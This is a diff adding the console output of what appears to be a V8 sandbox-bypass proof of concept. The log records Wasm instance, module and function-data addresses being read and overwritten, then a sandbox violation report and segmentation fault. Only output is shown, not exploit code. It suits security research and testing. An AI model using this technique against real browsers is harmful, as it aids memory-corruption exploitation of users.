@@ -1,0 +1,32 @@
+[*] Gathering info about Wasm Instance 0
+	[i] Wasm Instance 0:  0x19f538
+	[i] Wasm Module 0:  0x51895000517c1
+
+[*] Gathering info about Wasm Instance 2
+	[i] Wasm Instance 2:  0x19f958
+	[i] Wasm Module 2:  0x51ca5
+
+[*] Gathering info about Wasm Exported Function
+	[i] Wasm Function:  0x19f6ec
+	[i] Wasm Function Shared Info:  0x19f6bd
+	[i] Wasm Function Data:  0x19f691
+	[i] Wasm Function Data Index Addr:  0x19f6a4
+[*] Writing new index in Wasm Function Data
+	[i] Current Function data index:  0x7d000000002
+	[i] New Function data index:  0x7d000000322
+[*] Writing module 2 in instance 0
+	[i] Current Module 0:  0x51895000517c1
+	[i] New Module 0:  0x5189500051ca5
+Sandbox testing mode is enabled. Write to the page starting at 0x133649d8b000 (available from JavaScript as `Sandbox.targetPage`) to demonstrate a sandbox bypass.
+
+## V8 sandbox violation detected!
+
+Received signal 11 SEGV_ACCERR 133649d8b000
+
+==== C stack trace ===============================
+
+ [0x5da15767c027]
+ [0x74d021d83330]
+ [0x133649d8b000]
+[end of stack trace]
+Segmentation fault (core dumped)
